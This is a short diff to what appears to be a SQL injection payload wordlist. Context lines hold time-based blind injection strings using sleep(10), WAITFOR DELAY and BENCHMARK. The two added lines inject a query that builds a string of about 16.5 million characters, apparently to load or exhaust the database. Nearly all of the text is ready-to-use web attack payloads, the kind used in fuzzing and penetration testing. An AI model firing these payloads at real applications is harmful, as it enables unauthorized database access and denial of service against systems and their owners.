@@ -528,6 +528,8 @@ AND sleep(10) AND ('kleiton'='kleiton
 AND SLEEP(10) AND ('kleiton'='kleiton
 and WAITFOR DELAY '0:0:10'
 and WAITFOR DELAY '0:0:10'--
++(SELECT REPLICATE(CAST('X' AS VARCHAR(MAX)), 16500000))+
+'+(SELECT REPLICATE(CAST('X' AS VARCHAR(MAX)), 16500000))+'
 ") AS 1337 WHERE 1337=1337 AND ELT(1337=1337,sleep(10))-- 1337
 ")) AS 1337 WHERE 1337=1337 AND ELT(1337=1337,sleep(10))-- 1337
 ') AS 1337 WHERE 1337=1337 AND ELT(1337=1337,sleep(10))-- 1337
@@ -1022,3 +1024,4 @@ X'XOR(if((select now()=sysdate()),BENCHMARK(1000000,md5('xyz')),0))XOR'X
 zerodiumsleep(10);
 ')/**/OR/**/MID(0x352e362e33332d6c6f67,1,1)/**/LIKE/**/10/**/#
 1-if(mid(version/*f*/(),1,1)=5,sleep/*f*/(10),0)
+
